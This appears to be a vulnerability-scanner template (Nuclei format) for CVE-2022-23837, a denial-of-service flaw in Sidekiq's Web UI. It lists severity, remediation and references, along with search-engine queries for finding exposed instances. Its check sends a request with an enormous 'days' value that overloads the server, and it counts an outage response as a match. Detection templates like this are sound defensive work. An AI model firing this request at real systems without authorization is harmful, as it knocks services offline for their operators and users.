id: CVE-2022-23837

info:
  name: Sidekiq Denial of Service (DoS) via 'days' Parameter
  author: ProjectDiscoveryAI
  severity: high
  description: In api.rb in Sidekiq before 5.2.10 and 6.4.0, there is no limit on the number of days when requesting stats for the graph. This overloads the system, affecting the Web UI, and makes it unavailable to users.
  impact: |
    An attacker can exploit this vulnerability to cause a denial of service by sending a specially crafted request to the affected application.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of Sidekiq.
  reference:
    - https://github.com/TUTUMSPACE/exploits/blob/main/sidekiq.md
    - https://lists.debian.org/debian-lts-announce/2022/03/msg00015.html
    - https://lists.debian.org/debian-lts-announce/2023/03/msg00011.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2022-23837
    cwe-id: CWE-770
    epss-score: 0.01218
    epss-percentile: 0.85919
    cpe: cpe:2.3:a:contribsys:sidekiq:*:*:*:*:*:*:*:*
  metadata:
    vendor: contribsys
    product: sidekiq
    shodan-query: title:"Sidekiq"
    fofa-query: title="sidekiq"
    google-query: intitle:"sidekiq"

http:
  - method: GET
    path:
      - "{{BaseURL}}/sidekiq/?days=999999999"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
    matchers:
      - type: status
        status:
          - 502
          - 503
          - 504

      - type: word
        words:
          - "Service Unavailable"
          - "Gateway Timeout"
        part: body
        condition: or
